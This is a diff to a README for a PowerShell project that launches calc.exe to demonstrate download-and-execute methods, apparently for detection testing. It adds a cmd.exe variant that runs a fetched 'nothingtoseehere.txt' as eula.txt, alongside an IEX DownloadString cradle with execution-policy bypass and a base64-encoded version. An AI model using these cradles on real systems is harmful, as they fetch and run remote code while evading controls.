@@ -8,6 +8,9 @@ This powershell script just launch calc.exe using methods to download and execut
 ### Standard Execution
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/invokecalc.ps1');invoke-calc"
 
+### Execute with cmd.exe
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/runcalc/main/nothingtoseehere.txt') | Out-File eula.txt; cmd /c $(type .\eula.txt)
+
 ### Base 64 Encoded Execution
 powershell -noprofile -noninteractive -executionpolicy bypass -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGwAbwBzAHQAdAByAG8AbABsAC8AYgBsAHUAZQB0AGUAcwB0AHMALwBtAGEAaQBuAC8AaQBuAHYAbwBrAGUAYwBhAGwAYwAuAHAAcwAxACcAKQA7AGkAbgB2AG8AawBlAC0AYwBhAGwAYwAiAA==
 
